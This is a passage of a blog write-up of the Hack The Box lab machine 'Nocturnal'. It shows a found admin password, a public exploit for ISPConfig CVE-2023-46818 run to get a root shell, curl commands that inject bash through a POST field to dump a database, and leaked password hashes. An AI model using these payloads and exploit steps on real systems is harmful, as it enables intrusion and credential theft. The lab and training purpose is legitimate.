+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">tobias@nocturnal:~$ netstat -tuln</span><br><span class="line">Active Internet connections (only servers)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State</span><br><span class="line">tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN</span><br><span class="line">tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN</span><br><span class="line">tcp        0      0 127.0.0.1:587           0.0.0.0:*               LISTEN</span><br><span class="line">tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN</span><br><span class="line">tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN</span><br><span class="line">tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN</span><br><span class="line">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN</span><br><span class="line">tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN</span><br><span class="line">tcp6       0      0 :::22                   :::*                    LISTEN</span><br><span class="line">udp        0      0 127.0.0.53:53           0.0.0.0:*</span><br></pre></td></tr></table></figure></div>
+
+<p>Port forward and access the website returns the webpage for ISPCONFIG.<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/htb-nocturnal/Pasted image 20250413150838.png"
+                      width="500"
+                ></p>
+<ul>
+<li>after trying all the password combinations<ul>
+<li><code>admin:slowmotionapocalypse</code> works</li>
+</ul>
+</li>
+</ul>
+<p>After enumerating in the webpage, discover the version of ISPCONFIG running under “HELP” tab<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/htb-nocturnal/Pasted image 20250413151606.png"
+                      width="500"
+                ></p>
+<ul>
+<li>correlated to CVE-2023-46818</li>
+</ul>
+<h2 id="Exploitation-of-CVE-2023-46818"><a href="#Exploitation-of-CVE-2023-46818" class="headerlink" title="Exploitation of CVE-2023-46818"></a>Exploitation of CVE-2023-46818</h2><p>using the script by bipbopbup, (<a class="link"   target="_blank" rel="noopener" href="https://github.com/bipbopbup/CVE-2023-46818-python-exploit.git" >https://github.com/bipbopbup/CVE-2023-46818-python-exploit.git<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>)</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$ python3 exploit.py http://127.0.0.1:8080 admin slowmotionapocalypse</span><br><span class="line">[+] Target URL: http://127.0.0.1:8080/</span><br><span class="line">[+] Logging <span class="keyword">in</span> with username <span class="string">&#x27;admin&#x27;</span> and password <span class="string">&#x27;slowmotionapocalypse&#x27;</span></span><br><span class="line">[+] Injecting shell</span><br><span class="line">[+] Launching shell</span><br><span class="line"></span><br><span class="line">ispconfig-shell# <span class="built_in">whoami</span></span><br><span class="line">root</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ispconfig-shell# <span class="built_in">id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line"></span><br><span class="line">ispconfig-shell# <span class="built_in">cat</span> /root/root.txt</span><br><span class="line">16ca2a7c4bfa9da669766b6815663e82</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ispconfig-shell# <span class="built_in">cat</span> /home/tobias/user.txt</span><br><span class="line">a3b08c5bc876254b2ea0ba1316fd72e8</span><br></pre></td></tr></table></figure></div>
+
+
+<h2 id="After-14-5-2025-Patch"><a href="#After-14-5-2025-Patch" class="headerlink" title="After 14&#x2F;5&#x2F;2025 Patch"></a>After 14&#x2F;5&#x2F;2025 Patch</h2><ul>
+<li>nocturnal.db was hide from the initial foothold<ul>
+<li>therefore, attacker need to exploit command injection in the headers</li>
+</ul>
+</li>
+</ul>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ curl -i -X POST http://nocturnal.htb/admin.php -H <span class="string">&#x27;Cookie: PHPSESSID=t60iapg89eder1jqiroml27ar4&#x27;</span> --data-binary <span class="string">&#x27;password=%0Abash%09-c%09&quot;base64%</span></span><br><span class="line"><span class="string">09../nocturnal_database/nocturnal_database.db&quot;%0A&amp;backup=&#x27;</span></span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line">[snippet of <span class="built_in">base64</span>(nocturnal_database.db) goes here]</span><br><span class="line">[...]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">curl -i -X POST http://nocturnal.htb/admin.php -H <span class="string">&#x27;Cookie: PHPSESSID=t60iapg89eder1jqiroml27ar4&#x27;</span> --data-binary <span class="string">&#x27;password=%0Abash%09-c%09&quot;python3%09-m%09http.server%098888&quot;%0A&amp;backup=&#x27;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>After that, decode the base64 code into <code>nocturnal.db</code> and access the hashes</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ echo base64_extracted | base64 -d &gt;&gt; nocturnal.db </span><br><span class="line"></span><br><span class="line">$ file nocturnal.db</span><br><span class="line">nocturnal.db: SQLite 3.x database, last written using SQLite version 3031001, file counter 24, database pages 5, cookie 0x2, schema 4, UTF-8, version-valid-for 24</span><br><span class="line"></span><br><span class="line">muyi@mag3:~/Desktop/htb/machines/nocturnal~10.10.11.64/test$ sqlite3 nocturnal.db</span><br><span class="line">SQLite version 3.46.1 2024-08-13 09:16:08</span><br><span class="line">Enter &quot;.help&quot; for usage hints.</span><br><span class="line">sqlite&gt; .tables</span><br><span class="line">uploads  users</span><br><span class="line">sqlite&gt; select * from users;</span><br><span class="line">1|admin|d725aeba143f575736b07e045d8ceebb</span><br><span class="line">2|amanda|df8b20aa0c935023f99ea58358fb63c4</span><br><span class="line">4|tobias|55c82b1ccd55ab219b3b109b07d5061d</span><br><span class="line">6|khan101|827ccb0eea8a706c4c34a16891f84e7b</span><br><span class="line">7|muyi|a433c3b46c279c1b189ae164e78ff7d0</span><br><span class="line">8|buiducanh|5f4dcc3b5aa765d61d8327deb882cf99</span><br><span class="line">9|test|098f6bcd4621d373cade4e832627b4f6</span><br></pre></td></tr></table></figure></div>
+		</div>
+
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/HTB/">#HTB</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/Linux/">#Linux</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="prev" rel="prev" href="/2025/04/20/Hackthebox/htb-scepter/">
+					<span class="left arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-left"></i>
+					</span>
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">HTB-Scepter</span>
+						<span class="post-nav-item">Prev posts</span>
+					</span>
+				</a>
+			</div>
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2025/04/08/Hackthebox/htb-whiterabbit/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">HTB-WhiteRabbit</span>
+						<span class="post-nav-item">Next posts</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">On this page</div>
+		<div class="page-title">HTB-Nocturnal</div>
+		<ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Port-80"><span class="nav-text">Port 80</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Fuzzing-more-usernames"><span class="nav-text">Fuzzing more usernames</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#User"><span class="nav-text">User</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Root"><span class="nav-text">Root</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploitation-of-CVE-2023-46818"><span class="nav-text">Exploitation of CVE-2023-46818</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#After-14-5-2025-Patch"><span class="nav-text">After 14&#x2F;5&#x2F;2025 Patch</span></a></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2025</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-regular fa-computer-classic"></i>&nbsp;&nbsp;<a href="/">Muyi</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        37 posts in total
+                    </span>
+                    
+                </p>
+            
+        </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.5</a></span>
+        </div>
+        
+        
+        
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog "></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container">
+	<img src="">
+</div>
+
+	
+	<div class="search-pop-overlay">
+	<div class="popup search-popup">
+		<div class="search-header">
+			<span class="search-input-field-pre">
+				<i class="fa-solid fa-keyboard"></i>
+			</span>
+			<div class="search-input-container">
+				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Search..." spellcheck="false" type="search" class="search-input">
+			</div>
+			<span class="popup-btn-close">
+				<i class="fa-solid fa-times"></i>
+			</span>
+		</div>
+		<div id="search-result">
+			<div id="no-result">
+				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+			</div>
+		</div>
+	</div>
+</div>
+	
+
+</main>
+
+
+
+<script src="/js/build/libs/Swup.min.js"></script>
+
+<script src="/js/build/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+	
+<script src="/js/build/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/build/utils.js" type="module"></script>
+
+<script src="/js/build/main.js" type="module"></script>
+
+<script src="/js/build/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/build/layouts/categoryList.js" type="module"></script>
+
+
+
+    
+<script src="/js/build/tools/localSearch.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/layouts/lazyload.js" type="module"></script>
+
+
+
+
+
+
+  
+<script src="/js/build/libs/Typed.min.js"></script>
+
+  
+<script src="/js/build/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+    
+<script src="/js/build/libs/anime.min.js"></script>
+
+
+
+
+
+    
+<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+
+	
+</body>
+
+</html>
